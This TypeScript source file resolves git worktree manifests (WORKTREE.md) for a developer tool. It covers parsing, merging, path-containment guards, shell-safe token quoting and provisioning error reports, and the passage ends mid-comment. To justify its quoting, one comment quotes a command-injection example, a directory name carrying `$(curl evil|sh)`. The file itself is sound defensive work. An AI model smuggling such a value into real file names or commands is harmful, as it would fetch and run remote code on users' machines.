/**
 * Pure resolver for the per-project `WORKTREE.md` manifest — the committed,
 * tool-agnostic recipe for creating a *usable* git worktree.
 *
 * SIDE-EFFECT-FREE by contract (ADR-0001 pure-core / thin-shell): this module
 * never touches the filesystem. The shell (`worktree-ipc.ts`) reads the candidate
 * files off disk and hands their *contents* in via {@link ManifestSources}; this
 * module only parses, merges, and expands tokens. That keeps it unit-testable in
 * the node vitest env and lets the same deterministic result be reproduced by any
 * consumer (the Harnu engine, an agent following the file, or a human).
 *
 * The manifest is **trusted, committed repo content** (like a post-checkout hook),
 * not agent-supplied input — so `dir`/`setup`/`create` may legitimately point
 * outside the managed worktrees dir or run arbitrary commands. The agent-injection
 * surface (`branch`, `baseRef`) is still validated in {@link worktree-core}; this
 * resolver only expands the pre-validated `branch`/`slug`/`repo` tokens.
 *
 * Robustness rule (spec §Resolution order): a malformed manifest NEVER throws — it
 * degrades to the built-in default plus a non-fatal warning, so a bad `WORKTREE.md`
 * can't crash the create flow.
 */

import * as path from 'node:path'
import yaml from 'js-yaml'
import { slugifyBranch } from './worktree-core'

/** `seed.copy` = cp -a/--reflink (symlink-preserving); `seed.link` = symlink. */
export interface ManifestSeed {
  /** Paths copied into the worktree (`cp -a`/`--reflink=auto`, never hardlink). */
  copy: string[]
  /** Paths symlinked into the worktree (cheap; e.g. `node_modules/`). */
  link: string[]
}

/** Boot defaults (spec §boot). Per-task prompt/PRD comes from the invocation. */
export interface ManifestBoot {
  /** Default model for a session booted into the worktree. */
  model?: string
  /** Default boot-prompt template (may carry a `{prd}` token filled per task). */
  prompt?: string
}

/** Which candidate won the resolution (spec §Resolution order). */
export type ManifestSourceKind =
  | 'worktree-md' // WORKTREE.md / worktree-manifest.md at the repo root
  | 'claude-worktree-md' // .claude/worktree.md
  | 'legacy-config' // bin/worktree/worktree.config.json (imported)
  | 'default' // built-in default (no manifest, or a malformed one)

/**
 * Raw file *contents* the shell discovered. Each field is the file's text, or
 * `null`/absent when the file does not exist. This module does no I/O.
 */
export interface ManifestSources {
  /** WORKTREE.md (or its `worktree-manifest.md` alias) at the repo root. */
  worktreeMd?: string | null
  /** WORKTREE.local.md — gitignored per-machine overlay (deep-merged). */
  localMd?: string | null
  /** .claude/worktree.md — the second-priority location. */
  claudeWorktreeMd?: string | null
  /** bin/worktree/worktree.config.json — legacy per-repo config (imported). */
  legacyConfigJson?: string | null
  /** Whether the repo root has a `.env` (drives the built-in default `seed.copy`). */
  hasEnvFile?: boolean
}

/** Token-expansion context for the `dir` template. */
export interface ManifestContext {
  /** The git ref being created; fills `{branch}` (raw) and drives `{slug}`. */
  branch: string
  /** Repo directory basename; fills `{repo}`. */
  repo: string
}

/** A fully-resolved manifest: merged recipe + token-expanded `dir` + diagnostics. */
export interface ResolvedManifest {
  /** `dir` template with `{branch}`/`{slug}`/`{repo}` expanded. */
  dir: string
  /** Whether any real source (not the built-in default) set `dir`. The engine
   *  keeps its legacy `.claude/worktrees/<slug>` location when this is false. */
  dirExplicit: boolean
  /** Default base ref; a per-invocation `baseRef` still overrides it upstream. */
  from: string
  /** Deps to copy / link into the checkout. */
  seed: ManifestSeed
  /** Post-create deterministic commands, run sequentially in the new worktree. */
  setup: string[]
  /** Delegation escape hatch: when set, `create` OWNS the create flow. */
  create?: string
  /** Companion of `create` for teardown. */
  remove?: string
  /** Boot defaults. */
  boot: ManifestBoot
  /**
   * Worktree-relative directories that are regenerable by `setup` and may be
   * removed from an idle worktree to reclaim disk (Cleanup's "dehydrate", T250).
   * {@link DEFAULT_EPHEMERAL} when no source sets it. Listing a path here is
   * necessary, never sufficient: the Reaper still refuses anything git tracks or
   * does not ignore (`src/main/reaper/dehydrate-core.ts`).
   */
  ephemeral: string[]
  /** Which candidate the recipe came from. */
  source: ManifestSourceKind
  /** Whether a WORKTREE.local.md front-matter overlay was merged in. */
  localOverride: boolean
  /** Markdown body (front matter stripped) — the agent/human execution surface. */
  body: string
  /** Non-fatal diagnostics (malformed YAML, unknown keys, legacy import, …). */
  warnings: string[]
}

/** The recipe fields a single source can contribute (all optional → merged). */
interface PartialManifest {
  dir?: string
  from?: string
  seed?: { copy?: string[]; link?: string[] }
  setup?: string[]
  create?: string
  remove?: string
  boot?: { model?: string; prompt?: string }
  ephemeral?: string[]
}

/** The built-in default recipe (spec §Resolution order). */
const DEFAULT_DIR = '../{repo}-worktrees/{branch}'

/**
 * The default `ephemeral:` list — package-manager install targets ONLY.
 *
 * Build outputs and caches (`dist`, `build`, `.next`, `.nuxt`, `target`,
 * `.turbo`, `.gradle`) are deliberately absent: `setup` is an install recipe,
 * not a build, so it does not regenerate them — a Rust `target/` can be an hour
 * of compilation. The reversibility that makes dehydration safe does not hold
 * for them, so a project opts them in explicitly
 * (`docs/specs/2026-08-28-reaper-dehydrate-worktrees.md`).
 */
export const DEFAULT_EPHEMERAL: readonly string[] = ['node_modules', 'vendor', '.venv', 'venv']

const KNOWN_KEYS = new Set([
  'dir',
  'from',
  'seed',
  'setup',
  'create',
  'remove',
  'boot',
  'ephemeral'
])

/** Sentinel error for a front-matter root that parsed but isn't a mapping. */
const NOT_A_MAPPING = 'front matter is not a key/value mapping'

/**
 * A degraded-manifest warning suffix. For a genuine YAML *syntax* error (not the
 * structural "not a mapping" case), a single unquoted value with a leading YAML
 * indicator (`@`, `` ` ``, `!`, `&`, `*`, …) aborts the whole parse — the most
 * common author mistake is an unquoted `@file` boot prompt — so nudge toward
 * quoting. The recipe still degrades safely to the built-in default either way.
 */
function yamlHint(error: string | undefined): string {
  return error && error !== NOT_A_MAPPING
    ? ' (tip: quote values with a leading @ or other YAML indicator, e.g. prompt: "/implement @{prd}")'
    : ''
}

/**
 * Split a `WORKTREE.md` into its YAML front matter and markdown body. A front
 * matter block opens with a `---` line and closes with the next `---` line
 * (mirrors gray-matter). An unterminated open `---` is treated as no front matter
 * (the whole text is body) but flagged via `unterminated` so the caller can warn
 * \u2014 otherwise a forgotten closing fence would silently drop the whole recipe.
 */
function splitFrontMatter(raw: string): {
  frontMatter: string | null
  body: string
  unterminated: boolean
} {
  const text = raw.replace(/^\uFEFF/, '').replace(/\r\n/g, '\n')
  const lines = text.split('\n')
  if (lines[0]?.trim() !== '---') return { frontMatter: null, body: text, unterminated: false }
  for (let i = 1; i < lines.length; i++) {
    if (lines[i].trim() === '---') {
      return {
        frontMatter: lines.slice(1, i).join('\n'),
        body: lines.slice(i + 1).join('\n'),
        unterminated: false
      }
    }
  }
  return { frontMatter: null, body: text, unterminated: true }
}

/**
 * Parse a YAML front-matter block into a plain record. Returns `{ data: {} }` for
 * an empty block, `{ data: null, error }` for a YAML syntax error or a non-mapping
 * root (a bare list/scalar) — the caller degrades those to the built-in default.
 */
function parseYamlRecord(fm: string): { data: Record<string, unknown> | null; error?: string } {
  let parsed: unknown
  try {
    // FAILSAFE_SCHEMA keeps every scalar a STRING (no bool/number/Date coercion).
    // The manifest vocabulary is entirely strings + string-lists, so this is exact:
    // a version/tag base like `from: 1.20` or `from: 2024-01-01` must survive
    // verbatim, not become `1.2`/a Date that `asString` would then silently drop.
    // (js-yaml is untyped here — no @types — so narrow the result to `unknown`.)
    parsed = yaml.load(fm, { schema: yaml.FAILSAFE_SCHEMA }) as unknown
  } catch (e) {
    return { data: null, error: (e as Error).message.split('\n')[0] }
  }
  if (parsed == null) return { data: {} }
  if (typeof parsed !== 'object' || Array.isArray(parsed)) {
    return { data: null, error: NOT_A_MAPPING }
  }
  return { data: parsed as Record<string, unknown> }
}

/** Coerce `v` to a string array, warning on (and dropping) non-string items. */
function asStringArray(v: unknown, warnings: string[], label: string): string[] | undefined {
  if (!Array.isArray(v)) {
    warnings.push(`${label}: expected a list; ignored`)
    return undefined
  }
  const out: string[] = []
  for (const item of v) {
    if (typeof item === 'string') out.push(item)
    else warnings.push(`${label}: ignored a non-string list item`)
  }
  return out
}

/** Read a required-string field, warning on (and dropping) the wrong type. */
function asString(v: unknown, warnings: string[], label: string): string | undefined {
  if (typeof v === 'string') return v
  warnings.push(`${label}: expected a string; ignored`)
  return undefined
}

/**
 * Read a string field that must also be non-blank (for `dir`/`from`/`create`/
 * `remove`, where a blank value would resolve to the repo root / a whitespace-
 * named dir). A blank value is dropped with a warning so the field falls through
 * to the built-in default instead of producing a degenerate path.
 */
function asNonBlankString(v: unknown, warnings: string[], label: string): string | undefined {
  const s = asString(v, warnings, label)
  if (s === undefined) return undefined
  if (s.trim() === '') {
    warnings.push(`${label}: blank; ignored`)
    return undefined
  }
  return s
}

/**
 * Normalize a parsed front-matter record into a {@link PartialManifest} against
 * the closed vocabulary. Unknown keys and wrong-typed values are dropped with a
 * warning — never fatal.
 */
function normalizeRecord(
  data: Record<string, unknown>,
  warnings: string[],
  file: string
): PartialManifest {
  const p: PartialManifest = {}

  for (const key of Object.keys(data)) {
    if (!KNOWN_KEYS.has(key)) warnings.push(`${file}: unknown key "${key}" ignored`)
  }

  if ('dir' in data) {
    const v = asNonBlankString(data.dir, warnings, `${file}: dir`)
    if (v !== undefined) p.dir = v
  }
  if ('from' in data) {
    const v = asNonBlankString(data.from, warnings, `${file}: from`)
    if (v !== undefined) p.from = v
  }
  if ('create' in data) {
    const v = asNonBlankString(data.create, warnings, `${file}: create`)
    if (v !== undefined) p.create = v
  }
  if ('remove' in data) {
    const v = asNonBlankString(data.remove, warnings, `${file}: remove`)
    if (v !== undefined) p.remove = v
  }
  if ('setup' in data) {
    const arr = asStringArray(data.setup, warnings, `${file}: setup`)
    if (arr !== undefined) p.setup = arr
  }
  if ('ephemeral' in data) {
    const arr = asStringArray(data.ephemeral, warnings, `${file}: ephemeral`)
    if (arr !== undefined) p.ephemeral = arr
  }
  if ('seed' in data) {
    const seed = data.seed
    if (typeof seed === 'object' && seed !== null && !Array.isArray(seed)) {
      const rec = seed as Record<string, unknown>
      const s: { copy?: string[]; link?: string[] } = {}
      for (const k of Object.keys(rec)) {
        if (k !== 'copy' && k !== 'link') warnings.push(`${file}: unknown seed key "${k}" ignored`)
      }
      if ('copy' in rec) {
        const arr = asStringArray(rec.copy, warnings, `${file}: seed.copy`)
        if (arr !== undefined) s.copy = arr
      }
      if ('link' in rec) {
        const arr = asStringArray(rec.link, warnings, `${file}: seed.link`)
        if (arr !== undefined) s.link = arr
      }
      p.seed = s
    } else {
      warnings.push(`${file}: "seed" must be a mapping; ignored`)
    }
  }
  if ('boot' in data) {
    const boot = data.boot
    if (typeof boot === 'object' && boot !== null && !Array.isArray(boot)) {
      const rec = boot as Record<string, unknown>
      const b: { model?: string; prompt?: string } = {}
      for (const k of Object.keys(rec)) {
        if (k !== 'model' && k !== 'prompt')
          warnings.push(`${file}: unknown boot key "${k}" ignored`)
      }
      if ('model' in rec) {
        const v = asString(rec.model, warnings, `${file}: boot.model`)
        if (v !== undefined) b.model = v
      }
      if ('prompt' in rec) {
        const v = asString(rec.prompt, warnings, `${file}: boot.prompt`)
        if (v !== undefined) b.prompt = v
      }
      p.boot = b
    } else {
      warnings.push(`${file}: "boot" must be a mapping; ignored`)
    }
  }

  return p
}

/**
 * Import legacy `bin/worktree/worktree.config.json` as a fallback
 * source: `worktreesDir → dir` (a `{slug}` segment is appended so branch names
 * with `/` stay dir-safe) and `copy → seed.copy`. Invalid JSON degrades to `{}`.
 */
function importLegacyConfig(json: string, warnings: string[]): PartialManifest | null {
  let parsed: unknown
  try {
    parsed = JSON.parse(json)
  } catch {
    warnings.push('worktree.config.json: invalid JSON; ignored')
    return null
  }
  if (typeof parsed !== 'object' || parsed === null || Array.isArray(parsed)) {
    warnings.push('worktree.config.json: not an object; ignored')
    return null
  }
  const rec = parsed as Record<string, unknown>
  const p: PartialManifest = {}
  if (typeof rec.worktreesDir === 'string') {
    p.dir = `${rec.worktreesDir.replace(/\/+$/, '')}/{slug}`
  }
  if (Array.isArray(rec.copy)) {
    const arr = asStringArray(rec.copy, warnings, 'worktree.config.json: copy')
    if (arr !== undefined) p.seed = { copy: arr }
  }
  return p
}

/**
 * Deep-merge `over` onto `base`: objects (`seed`, `boot`) merge sub-keys, arrays
 * (`seed.copy`/`seed.link`/`setup`) replace wholesale, scalars replace. Mirrors
 * the legacy `worktree.mjs:deepMerge` semantics the spec pins to.
 */
function mergeManifest(base: PartialManifest, over: PartialManifest): PartialManifest {
  const out: PartialManifest = { ...base }
  if (over.dir !== undefined) out.dir = over.dir
  if (over.from !== undefined) out.from = over.from
  if (over.create !== undefined) out.create = over.create
  if (over.remove !== undefined) out.remove = over.remove
  if (over.setup !== undefined) out.setup = over.setup
  if (over.ephemeral !== undefined) out.ephemeral = over.ephemeral
  if (over.seed !== undefined) {
    out.seed = { ...(base.seed ?? {}) }
    if (over.seed.copy !== undefined) out.seed.copy = over.seed.copy
    if (over.seed.link !== undefined) out.seed.link = over.seed.link
  }
  if (over.boot !== undefined) {
    out.boot = { ...(base.boot ?? {}) }
    if (over.boot.model !== undefined) out.boot.model = over.boot.model
    if (over.boot.prompt !== undefined) out.boot.prompt = over.boot.prompt
  }
  return out
}

/** The recipe half of a chosen primary source, plus its body and origin. */
interface PrimarySelection {
  partial: PartialManifest
  body: string
  source: ManifestSourceKind
}

/**
 * Pick the highest-priority present source and parse its recipe (spec order:
 * WORKTREE.md → .claude/worktree.md → legacy config → default). A present-but-
 * malformed `WORKTREE.md`/`.claude/worktree.md` degrades to the default recipe
 * (source `default`) rather than falling through, but its body is retained.
 */
function selectPrimary(sources: ManifestSources, warnings: string[]): PrimarySelection {
  const markdownCandidates: Array<{ text: string; source: ManifestSourceKind; file: string }> = []
  if (sources.worktreeMd != null)
    markdownCandidates.push({
      text: sources.worktreeMd,
      source: 'worktree-md',
      file: 'WORKTREE.md'
    })
  else if (sources.claudeWorktreeMd != null)
    markdownCandidates.push({
      text: sources.claudeWorktreeMd,
      source: 'claude-worktree-md',
      file: '.claude/worktree.md'
    })

  if (markdownCandidates.length > 0) {
    const { text, source, file } = markdownCandidates[0]
    const { frontMatter, body, unterminated } = splitFrontMatter(text)
    if (frontMatter === null) {
      if (unterminated)
        warnings.push(`${file}: unterminated front matter (missing closing "---"); treated as body`)
      return { partial: {}, body, source }
    }
    const { data, error } = parseYamlRecord(frontMatter)
    if (data === null) {
      warnings.push(`${file}: ${error}; using defaults${yamlHint(error)}`)
      return { partial: {}, body, source: 'default' }
    }
    return { partial: normalizeRecord(data, warnings, file), body, source }
  }

  if (sources.legacyConfigJson != null) {
    const legacy = importLegacyConfig(sources.legacyConfigJson, warnings)
    if (legacy !== null) return { partial: legacy, body: '', source: 'legacy-config' }
  }

  return { partial: {}, body: '', source: 'default' }
}

/** Expand `{branch}`/`{slug}`/`{repo}` in a `dir` template. Function replacers
 *  insert values LITERALLY — `{repo}` = `basename(repoRoot)` is not validated and
 *  could contain `$`, which a plain string replacement would treat as a `$&`/`$1`
 *  pattern. */
function expandDir(template: string, ctx: ManifestContext): string {
  const slug = slugifyBranch(ctx.branch)
  return template
    .replace(/\{branch\}/g, () => ctx.branch)
    .replace(/\{slug\}/g, () => slug)
    .replace(/\{repo\}/g, () => ctx.repo)
}

/**
 * Resolve the manifest for a worktree creation: pick the winning source, overlay
 * `WORKTREE.local.md`, fill unset fields from the built-in default, and expand
 * the `dir` tokens. Never throws — a malformed manifest yields the default recipe
 * plus a warning.
 *
 * @param sources - file contents the shell discovered (this module does no I/O).
 * @param ctx - `{ branch, repo }` for `dir` token expansion.
 */
export function resolveManifest(sources: ManifestSources, ctx: ManifestContext): ResolvedManifest {
  const warnings: string[] = []

  const primary = selectPrimary(sources, warnings)
  let explicitDir = primary.partial.dir !== undefined
  let body = primary.body

  // Built-in default recipe, then overlay the winning source's partial.
  const base: PartialManifest = {
    dir: DEFAULT_DIR,
    from: 'HEAD',
    seed: { copy: sources.hasEnvFile ? ['.env'] : [], link: [] },
    setup: [],
    boot: {}
  }
  let merged = mergeManifest(base, primary.partial)

  // WORKTREE.local.md overlay (deep-merge front matter; body replaces if present).
  let localOverride = false
  if (sources.localMd != null) {
    const local = splitFrontMatter(sources.localMd)
    if (local.unterminated)
      warnings.push(
        'WORKTREE.local.md: unterminated front matter (missing closing "---"); overlay ignored'
      )
    if (local.frontMatter !== null) {
      const { data, error } = parseYamlRecord(local.frontMatter)
      if (data === null) {
        warnings.push(`WORKTREE.local.md: ${error}; overlay ignored${yamlHint(error)}`)
      } else {
        const localPartial = normalizeRecord(data, warnings, 'WORKTREE.local.md')
        merged = mergeManifest(merged, localPartial)
        localOverride = true
        if (localPartial.dir !== undefined) explicitDir = true
      }
    }
    if (local.body.trim().length > 0) body = local.body
  }

  const resolved: ResolvedManifest = {
    dir: expandDir(merged.dir ?? DEFAULT_DIR, ctx),
    dirExplicit: explicitDir,
    from: merged.from ?? 'HEAD',
    seed: { copy: merged.seed?.copy ?? [], link: merged.seed?.link ?? [] },
    setup: merged.setup ?? [],
    boot: { ...(merged.boot ?? {}) },
    ephemeral: merged.ephemeral ?? [...DEFAULT_EPHEMERAL],
    source: primary.source,
    localOverride,
    body,
    warnings
  }
  if (merged.create !== undefined) resolved.create = merged.create
  if (merged.remove !== undefined) resolved.remove = merged.remove
  return resolved
}

// ── Step 2 planners: pure, side-effect-free helpers the engine executes ────────

/**
 * Resolve a manifest `dir` (already token-expanded) to an absolute worktree path.
 * A relative `dir` (e.g. `../acme-worktrees/feat`) is resolved against the repo
 * root — so the sibling layout the spec favors lands beside the repo, not inside
 * `.claude/worktrees`. An absolute `dir` is normalized verbatim.
 */
export function resolveWorktreeDir(repoRoot: string, dir: string): string {
  const abs = path.isAbsolute(dir) ? path.normalize(dir) : path.resolve(repoRoot, dir)
  // Drop a single trailing separator (matches deriveWorktreePath's convention).
  return abs.length > 1 && abs.endsWith(path.sep) ? abs.slice(0, -1) : abs
}

/** One seed operation: copy (`cp -a`/`--reflink`) or link (symlink) a path in. */
export interface SeedOp {
  kind: 'copy' | 'link'
  /** The entry as written in the manifest (for logs/errors). */
  entry: string
  /** Absolute source path in the repo root. */
  from: string
  /** Absolute destination path in the new worktree. */
  to: string
}

/**
 * Build the ordered list of seed operations for a resolved manifest. Each entry
 * resolves to `<repoRoot>/<entry>` → `<worktreePath>/<entry>` (absolute), copies
 * first then links. Empty/whitespace entries are dropped. Pure — the shell
 * executes the ops (`cp -a --reflink=auto` for copy, `fs.symlink` for link).
 */
export function buildSeedPlan(
  seed: ManifestSeed,
  opts: { repoRoot: string; worktreePath: string }
): SeedOp[] {
  const ops: SeedOp[] = []
  const push = (kind: 'copy' | 'link', entry: string): void => {
    const trimmed = entry.trim()
    if (!trimmed) return
    const from = path.resolve(opts.repoRoot, trimmed)
    const to = path.resolve(opts.worktreePath, trimmed)
    // Containment guard (T09): drop any seed entry that escapes the repo root
    // (source) or the worktree (destination) — e.g. `../x` or an absolute
    // `/foo`. `applySeedPlan` `rm -rf`s `to` before copying, so an escaping
    // destination would recursively delete OUTSIDE the worktree. The manifest is
    // trusted committed content, but a hand-edited `..`/absolute entry is an easy
    // footgun; silently skip it rather than delete the wrong tree.
    if (!isContainedPath(opts.repoRoot, from) || !isContainedPath(opts.worktreePath, to)) return
    ops.push({ kind, entry, from, to })
  }
  for (const e of seed.copy) push('copy', e)
  for (const e of seed.link) push('link', e)
  return ops
}

/** Whether `child` resolves strictly inside `base` (rejects `..` escapes + absolutes). */
function isContainedPath(base: string, child: string): boolean {
  const rel = path.relative(base, child)
  return rel !== '' && !rel.startsWith('..') && !path.isAbsolute(rel)
}

/**
 * Expand `{branch}`/`{slug}`/`{repo}`/`{from}` in a delegated `create`/`remove`
 * command string (spec §create/remove), which runs via `sh -c`. `{branch}` is
 * validated upstream (`SAFE_BRANCH`) and `{slug}` is derived from it, so both are
 * shell-metachar-free and inserted literally. `{repo}` (the repo dir basename)
 * and `{from}` (the base ref) are NOT pre-validated — a repo directory named
 * `proj$(curl evil|sh)` or a crafted `from` would otherwise inject a command
 * substitution — so they are single-quoted before interpolation (T11).
 */
export function expandCommandTokens(
  cmd: string,
  tokens: { branch: string; from: string; repo: string }
): string {
  const slug = slugifyBranch(tokens.branch)
  return cmd
    .replace(/\{branch\}/g, () => tokens.branch)
    .replace(/\{slug\}/g, () => slug)
    .replace(/\{repo\}/g, () => shSingleQuote(tokens.repo))
    .replace(/\{from\}/g, () => shSingleQuote(tokens.from))
}

/** Single-quote a value for safe interpolation into a POSIX `sh -c` command word. */
function shSingleQuote(v: string): string {
  return `'${v.replace(/'/g, `'\\''`)}'`
}

/** The shell commands a create_worktree confirm must disclose (the RCE surface). */
export interface DisclosedWorktreeCommands {
  /** True when the manifest delegates creation (`create:`); false = git-add + seed + setup. */
  delegated: boolean
  /**
   * Ordered commands that run on the SUCCESS path, verbatim as `sh -c` runs them.
   * Delegated: `[expanded create]`. Non-delegated: the raw `setup[]` (NOT
   * token-expanded, matching `worktree-ipc.ts` which runs setup entries directly).
   * Empty when nothing runs.
   */
  commands: string[]
  /** The companion `remove` (token-expanded), which runs ONLY on rollback. Absent otherwise. */
  removeOnFailure?: string
}

/**
 * Derive the exact `sh -c` command strings a worktree create will run, for the
 * operator confirm disclosure (T08). Fidelity contract — must match
 * `worktree-ipc.ts` execution byte-for-byte:
 *  - delegated `create`/`remove` ARE token-expanded → expand here.
 *  - `setup[]` is NOT token-expanded (it runs raw) → return it verbatim.
 * Pure — no I/O; the shell hands in the already-resolved manifest + tokens.
 */
export function disclosedWorktreeCommands(
  manifest: ResolvedManifest,
  tokens: { branch: string; from: string; repo: string }
): DisclosedWorktreeCommands {
  if (manifest.create !== undefined) {
    const out: DisclosedWorktreeCommands = {
      delegated: true,
      commands: [expandCommandTokens(manifest.create, tokens)]
    }
    if (manifest.remove !== undefined) {
      out.removeOnFailure = expandCommandTokens(manifest.remove, tokens)
    }
    return out
  }
  return { delegated: false, commands: [...manifest.setup] }
}

/**
 * Sanity guard for a resolved worktree target: reject the repo root itself and
 * anything inside its `.git` dir. This is a footgun check on trusted manifest
 * content, NOT the agent-injection boundary — that stays in
 * {@link validateWorktreeRequest} (branch/baseRef). The agent never supplies the
 * path; it comes from the committed `dir` template + the validated branch.
 */
export function isSafeWorktreeTarget(repoRoot: string, target: string): boolean {
  const root = path.normalize(repoRoot)
  const t = path.normalize(target)
  if (t === root) return false
  const gitDir = path.join(root, '.git')
  if (t === gitDir || t.startsWith(gitDir + path.sep)) return false
  // Reject an ancestor of the repo root (e.g. `dir: ..`) — a worktree there would
  // enclose the repo and its `.git`. `root` being inside `t` means `t` is an ancestor.
  if (root.startsWith(t + path.sep)) return false
  return true
}

// ── BUG-28: setup/seed failure classification + disclosure ─────────────────
//
// Two distinct facts a bare `stderr` string hides from the caller: (1) whether
// the command that failed was even FOUND (a missing binary vs. a real failure),
// and (2) that a seed/setup failure always triggers a transactional rollback —
// see `worktree-ipc.ts`'s `rollbackWorktree`. Both are disclosed here, on both
// the UI (`Error.message`) and MCP (`provisionErrorPayload`) surfaces, from ONE
// pure formatter so the wording can never drift (spec §3 "One message, both
// surfaces").

/** The shape of an `execFile` rejection (or an fs error) {@link classifyManifestFailure} reads. */
export interface ManifestCommandRejection {
  code?: number | string | null
  signal?: string | null
  killed?: boolean
  stderr?: string
}

/** Which of the three ways a manifest command can fail. */
export type ManifestFailureKind = 'binary-missing' | 'command-failed' | 'timeout'

/** The pure classification `runManifestCommand`'s rejection distills to. */
export interface ManifestFailureClassification {
  kind: ManifestFailureKind
  /** Set only when `kind === 'binary-missing'`. */
  binary?: string
  /** Set only when `kind === 'command-failed'` and the child reported one. */
  exitCode?: number
}

/** `sh`/`dash`: `sh: 1: npm: not found` — the name precedes ": not found". */
const NOT_FOUND_SUFFIX = /(\S+):\s*not found\s*$/
/** `zsh`: `zsh: command not found: npm` — the name follows the phrase. */
const NOT_FOUND_PREFIX = /command not found:\s*(\S+)/

/**
 * The missing binary's name, read off the shell's own `stderr` (both dialects
 * spec §1 names), falling back to the first whitespace-delimited token of the
 * command string when `stderr` has nothing recognizable (e.g. a Node `ENOENT`
 * with no child ever spawned to produce a shell message).
 */
function extractMissingBinary(stderr: string | undefined, cmd: string): string {
  const trimmed = (stderr ?? '').trim()
  const suffix = trimmed.match(NOT_FOUND_SUFFIX)
  if (suffix) return suffix[1]
  const prefix = trimmed.match(NOT_FOUND_PREFIX)
  if (prefix) return prefix[1]
  return cmd.trim().split(/\s+/)[0] ?? cmd
}

/**
 * Classify a manifest command's failure (spec §1) as a PURE function over the
 * rejection shape — the env-bound `execFile` call stays in `worktree-ipc.ts`
 * (ADR-0001).
 *
 * - **timeout** — `killed` against `SETUP_TIMEOUT_MS` (checked first: a killed
 *   process's `code`/`signal` can otherwise look like anything).
 * - **binary-missing** — exit `127` (`sh -c` could not find the command) or
 *   Node's `ENOENT` (the shell binary itself is absent).
 * - **command-failed** — any other non-zero exit; the command was found, its
 *   own failure is the story.
 */
export function classifyManifestFailure(
  rejection: ManifestCommandRejection,
  cmd: string
): ManifestFailureClassification {
  if (rejection.killed === true && rejection.signal === 'SIGTERM') {
    return { kind: 'timeout' }
  }
  if (rejection.code === 127 || rejection.code === 'ENOENT') {
    return { kind: 'binary-missing', binary: extractMissingBinary(rejection.stderr, cmd) }
  }
  const exitCode = typeof rejection.code === 'number' ? rejection.code : undefined
  return { kind: 'command-failed', ...(exitCode !== undefined ? { exitCode } : {}) }
}

/** Which phase of provisioning failed (spec §2). */
export type WorktreeProvisionStage = 'seed' | 'setup' | 'delegated-create'

/** 1-based position among a multi-command stage (`setup step 1 of 2`). */
export interface WorktreeProvisionStep {
  index: number
  total: number
}

/** The enriched, structured facts a seed/setup/delegated-create failure carries (spec §2). */
export interface WorktreeProvisionErrorFields {
  stage: WorktreeProvisionStage
  /** Present only when the stage has steps (`setup`). */
  step?: WorktreeProvisionStep
  /** The command verbatim, as run — never a paraphrase. */
  command: string
  kind: ManifestFailureKind
  /** The missing binary's name — set only when `kind === 'binary-missing'`. */
  binary?: string
  /** The resolved `PATH` the setup shell used — set only on `binary-missing`. */
  path?: string
  /** The child's exit code, when there was one. */
  exitCode?: number
  /** Verbatim, trimmed stderr. */
  stderr?: string
  /** `true` when the checkout was removed. */
  rolledBack: boolean
  /** The branch `add -b` created and rollback deleted, or `null`. */
  branchDeleted: string | null
}

/**
 * Render the human-readable rendering of a provision failure — ONE pure
 * formatter, used by the UI create path (as `WorktreeProvisionError.message`)
 * AND the MCP ACK (`provisionErrorPayload.message`), so the wording can never
 * drift (spec §3).
 */
export function formatProvisionError(fields: WorktreeProvisionErrorFields): string {
  const lines: string[] = []
  const stageLabel = fields.stage === 'delegated-create' ? 'create' : fields.stage
  const stepLabel = fields.step ? ` step ${fields.step.index} of ${fields.step.total}` : ''
  const exitSuffix =
    fields.kind === 'command-failed' && fields.exitCode !== undefined
      ? ` (exit ${fields.exitCode})`
      : ''
  lines.push(`${stageLabel}${stepLabel} failed: \`${fields.command}\`${exitSuffix}`)

  if (fields.kind === 'binary-missing') {
    lines.push(`${fields.binary}: command not found — Harnu's setup shell could not find it.`)
    if (fields.path) lines.push(`PATH used: ${fields.path}`)
    lines.push(
      `Either ${fields.binary} is not installed, or Harnu cannot see it ` +
        '(GUI launch + mise/nvm/Homebrew).'
    )
  } else if (fields.kind === 'timeout') {
    lines.push('The command timed out and was killed.')
  } else if (fields.stderr) {
    lines.push(fields.stderr)
  }

  lines.push(
    fields.rolledBack
      ? fields.branchDeleted
        ? `The worktree was created and rolled back; branch \`${fields.branchDeleted}\` was deleted.`
        : 'The worktree was created and rolled back.'
      : 'The worktree may still exist on disk — rollback did not complete cleanly; ' +
          'check `git worktree list`.'
  )

  return lines.join('\n')
}

/**
 * A typed, structured worktree-provisioning failure (spec §2) — thrown by
 * `createWorktree`'s seed/setup/delegated-create catch, AFTER the rollback
 * runs (so `rolledBack`/`branchDeleted` are observed facts, never assumed).
 * `.message` is the same rendering `provisionErrorPayload` echoes as
 * `message`, so a plain `err.message` read (the UI path, across the IPC
 * boundary where custom fields don't survive) still gets the full disclosure.
 */
/**
 * Cap `stderr` so a runaway/binary-noisy setup command can't blow up the
 * `.message`/MCP-ACK payload — spec §2 "verbatim, trimmed, capped". Cuts on a
 * line boundary where possible so the tail isn't chopped mid-word.
 */
const STDERR_CAP = 4000

function capStderr(stderr: string | undefined): string | undefined {
  const trimmed = stderr?.trim()
  if (!trimmed) return trimmed
  if (trimmed.length <= STDERR_CAP) return trimmed
  const cut = trimmed.slice(0, STDERR_CAP)
  const lastNewline = cut.lastIndexOf('\n')
  const head = lastNewline > STDERR_CAP * 0.5 ? cut.slice(0, lastNewline) : cut
  return `${head}\n… (truncated, ${trimmed.length - head.length} more characters)`
}

export class WorktreeProvisionError extends Error implements WorktreeProvisionErrorFields {
  readonly stage: WorktreeProvisionStage
  readonly step?: WorktreeProvisionStep
  readonly command: string
  readonly kind: ManifestFailureKind
  readonly binary?: string
  readonly path?: string
  readonly exitCode?: number
  readonly stderr?: string
  readonly rolledBack: boolean
  readonly branchDeleted: string | null

  constructor(fields: WorktreeProvisionErrorFields) {
    const capped = { ...fields, stderr: capStderr(fields.stderr) }
    super(formatProvisionError(capped))
    this.name = 'WorktreeProvisionError'
    this.stage = capped.stage
    this.step = capped.step
    this.command = capped.command
    this.kind = capped.kind
    this.binary = capped.binary
    this.path = capped.path
    this.exitCode = capped.exitCode
    this.stderr = capped.stderr
    this.rolledBack = capped.rolledBack
    this.branchDeleted = capped.branchDeleted
  }
}

/** One concrete way for the agent to progress (mirrors `deny-hint.ts`'s `NextAction`). */
interface ProvisionNextAction {
  do: string
  why: string
}

/**
 * Reshape a {@link WorktreeProvisionError} into the MCP `create_worktree` ACK's
 * structured error payload (spec §3) — the same `{error, message, nextActions}`
 * steer shape `tool-result.ts`/`deny-hint.ts` already use, PLUS the fields
